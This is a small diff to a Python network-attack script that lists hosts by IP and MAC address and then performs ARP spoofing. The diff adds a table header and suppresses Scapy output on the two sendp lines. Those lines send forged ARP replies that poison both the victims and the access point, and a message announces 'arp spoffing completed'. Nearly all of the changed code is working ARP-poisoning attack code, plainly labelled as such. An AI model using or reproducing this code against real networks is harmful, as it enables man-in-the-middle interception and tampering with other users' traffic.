@@ -55,6 +55,7 @@ def scan_net(ip):
 		vmac.append(line[3])
 		lines = stream.readline()
 
+	print("IP\t\t\tMAC Address\n-----------------------------------------")
 	for i in range(len(vip)):
 		print(vip[i] + "\t\t" + vmac[i])
 
@@ -89,8 +90,8 @@ def arp():
 		for i in range(10):
 			#print('send arp ', i)
 			#print(vip[v],vmac[v])
-			sendp(Ether(dst=vmac[v], src=attacker_mac)/ARP(pdst=vip[v], psrc=ap_ip, hwdst=vmac[v], hwsrc=attacker_mac, op=2))
-			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[v], hwdst=vmac[v], hwsrc=attacker_mac, op=2))
+			sendp(Ether(dst=vmac[v], src=attacker_mac)/ARP(pdst=vip[v], psrc=ap_ip, hwdst=vmac[v], hwsrc=attacker_mac, op=2),verbose=0)
+			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[v], hwdst=vmac[v], hwsrc=attacker_mac, op=2),verbose=0)
 			time.sleep(0.1)
 
 	print("arp spoffing completed.\n")
